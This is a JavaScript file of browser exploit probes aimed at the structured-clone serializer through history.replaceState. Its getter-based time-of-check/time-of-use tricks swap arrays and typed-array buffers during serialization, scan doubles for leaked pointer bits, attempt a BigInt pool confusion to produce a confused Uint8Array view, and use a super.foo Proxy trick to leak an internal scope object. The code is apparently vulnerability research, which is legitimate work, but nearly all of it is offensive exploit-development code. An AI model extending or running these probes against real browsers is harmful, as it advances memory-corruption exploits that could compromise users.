// SC TOCTOU via getter properties — plain objects with getters
// Unlike Proxy (rejected by SC), accessor properties on normal objects
// might have their getters called during serialization.
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

// ─── Test 1: Does getter fire during SC? ───
test('getter_fires', function() {
  var fired = false;
  var callCount = 0;
  var obj = {};
  Object.defineProperty(obj, 'x', {
    get: function() { fired = true; callCount++; return 42; },
    enumerable: true
  });
  obj.y = 'normal';

  try {
    history.replaceState(obj, '');
    var c = history.state;
    history.replaceState(null, '');
    return {
      result: fired ? 'GETTER_FIRED' : 'not_fired',
      callCount: callCount,
      x: c ? c.x : null,
      y: c ? c.y : null
    };
  } catch(e) {
    return { result: 'error', msg: e.message, fired: fired, callCount: callCount };
  }
});

// ─── Test 2: Getter modifies later element in array during SC ───
test('getter_toctou_array', function() {
  var doubles = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
  var triggered = false;

  var trigger = {};
  Object.defineProperty(trigger, 'x', {
    get: function() {
      if (!triggered) {
        triggered = true;
        // Convert doubles array to have objects
        var leaked = { LEAKED: true };
        doubles[0] = leaked;
        doubles[1] = leaked;
      }
      return 1;
    },
    enumerable: true
  });

  var data = [trigger, doubles];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null', triggered: triggered };

    var arr = c[1];
    var info = [];
    for (var i = 0; i < arr.length; i++) {
      info.push({ idx: i, type: typeof arr[i], val: typeof arr[i] === 'number' ? f64ToHex(arr[i]) : JSON.stringify(arr[i]).substring(0, 40) });
    }

    // Check for pointer leaks
    var leaks = [];
    for (var i = 0; i < arr.length; i++) {
      if (typeof arr[i] === 'number' && arr[i] !== [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8][i]) {
        leaks.push({ idx: i, hex: f64ToHex(arr[i]) });
      }
    }

    return {
      result: leaks.length > 0 ? 'LEAK' : (triggered ? 'modified_clean' : 'not_triggered'),
      triggered: triggered,
      len: arr.length,
      items: info,
      leaks: leaks
    };
  } catch(e) {
    return { result: 'error', msg: e.message, triggered: triggered };
  }
});

// ─── Test 3: Getter swaps ArrayBuffer backing during SC ───
test('getter_buf_swap', function() {
  var bigBuf = new ArrayBuffer(256);
  new Uint8Array(bigBuf).fill(0xBB);
  var bigView = new Uint8Array(bigBuf);

  var smallBuf = new ArrayBuffer(16);
  new Uint8Array(smallBuf).fill(0xAA);

  var swapped = false;
  var holder = {};
  Object.defineProperty(holder, 'trigger', {
    get: function() {
      if (!swapped) {
        swapped = true;
        // Replace view in the data array that hasn't been serialized yet
        data[2] = new Uint8Array(smallBuf);
      }
      return 'fired';
    },
    enumerable: true
  });

  var data = [holder, bigBuf, bigView];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null', swapped: swapped };

    var v = c[2];
    if (v instanceof Uint8Array) {
      return {
        result: v[0] === 0xAA ? 'SWAPPED' : (v[0] === 0xBB ? 'original' : 'unknown_' + v[0]),
        len: v.length,
        bufLen: v.buffer.byteLength,
        byte0: v[0],
        swapped: swapped
      };
    }
    return { result: 'not_u8', type: typeof v, swapped: swapped };
  } catch(e) {
    return { result: 'error', msg: e.message, swapped: swapped };
  }
});

// ─── Test 4: valueOf / toPrimitive during SC number handling ───
test('valueof_sc', function() {
  var fired = { valueOf: false, toPrim: false };

  var fakeNum = {};
  fakeNum.valueOf = function() { fired.valueOf = true; return 42; };
  fakeNum[Symbol.toPrimitive] = function() { fired.toPrim = true; return 99; };

  try {
    history.replaceState({ n: fakeNum }, '');
    var c = history.state;
    history.replaceState(null, '');
    return {
      result: 'valueof_test',
      fired: fired,
      val: c ? c.n : null,
      type: c ? typeof c.n : null
    };
  } catch(e) {
    return { result: 'error', msg: e.message, fired: fired };
  }
});

// ─── Test 5: Getter + BigInt pool confusion combo ───
// Use getter to modify the filler array DURING serialization of earlier elements
// If the getter fires after BigInts are counted but before views are serialized,
// we might change the pool layout
test('getter_pool_manip', function() {
  var filler = [];
  var triggered = false;

  // First: a getter object
  var trigObj = {};
  Object.defineProperty(trigObj, 'go', {
    get: function() {
      if (!triggered) {
        triggered = true;
        // Add MORE BigInts to the filler — increasing the shift
        filler.push(99n);
        filler.push(100n);
        filler.push(101n);
      }
      return 'done';
    },
    enumerable: true
  });

  filler.push(1n); // shift = 1 normally

  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xEE);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xFF);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  filler.push(trigObj); // getter fires here during serialization
  filler.push(target);
  filler.push(v1);
  filler.push(v2);
  while (filler.length < 80) filler.push({ p: filler.length });

  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  try {
    history.replaceState(outer, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null', triggered: triggered };

    // Find the confused view
    var f = c[0];
    var viewIdx = -1;
    for (var i = 0; i < 20; i++) {
      if (f[i] instanceof Uint8Array) {
        viewIdx = i;
        break;
      }
    }

    if (viewIdx < 0) return { result: 'no_view', triggered: triggered, fillerLen: f.length };

    // Check the LAST Uint8Array — it should be the confused one
    var views = [];
    for (var i = 0; i < Math.min(20, f.length); i++) {
      if (f[i] instanceof Uint8Array) {
        views.push({ idx: i, byte0: f[i][0], len: f[i].length, bufLen: f[i].buffer.byteLength });
      }
    }

    return {
      result: 'getter_pool',
      triggered: triggered,
      fillerLen: f.length,
      views: views
    };
  } catch(e) {
    return { result: 'error', msg: e.message, triggered: triggered };
  }
});

// ─── Test 6: Scope leak + confused buffer ───
// Use the super.foo scope leak to get an internal object reference,
// then try to determine its address via timing or side channels
test('scope_leak_explore', function() {
  var L = class { leak() { return super.foo; } };
  L.prototype.__proto__ = new Proxy({}, {
    get: function(t, p, r) { return r; }
  });
  var lk = L.prototype.leak;
  var scope = (function() { var SECRET = 0xDEADBEEF; return lk(); })();

  if (!scope || scope === window) return { result: 'no_scope' };

  // Explore the scope object
  var props = [];
  try { props = Object.getOwnPropertyNames(scope); } catch(e) {}
  var enumProps = [];
  try { for (var k in scope) enumProps.push(k); } catch(e) {}

  var protoChain = [];
  try {
    var p = scope;
    for (var i = 0; i < 5; i++) {
      p = Object.getPrototypeOf(p);
      if (!p) break;
      protoChain.push(p.constructor ? p.constructor.name : '?');
    }
  } catch(e) { protoChain.push('error: ' + e.message); }

  // Try to access scope properties
  var accessResults = {};
  try { accessResults.SECRET = scope.SECRET; } catch(e) { accessResults.SECRET = 'err:' + e.message; }
  try { accessResults.type = typeof scope; } catch(e) {}
  try { accessResults.ctor = scope.constructor ? scope.constructor.name : '?'; } catch(e) {}
  try { accessResults.str = String(scope).substring(0, 50); } catch(e) { accessResults.str = 'err'; }
  try { accessResults.json = JSON.stringify(scope).substring(0, 100); } catch(e) { accessResults.json = 'err:' + e.message.substring(0, 50); }

  // Can the scope be stored in an array or object?
  var storable = false;
  try {
    var arr = [scope, 1.1, 2.2];
    storable = arr[0] === scope;
  } catch(e) {}

  return {
    result: 'scope_explored',
    type: typeof scope,
    props: props.slice(0, 10),
    enumProps: enumProps.slice(0, 10),
    protoChain: protoChain,
    access: accessResults,
    storable: storable
  };
});

return JSON.stringify(results);
})();
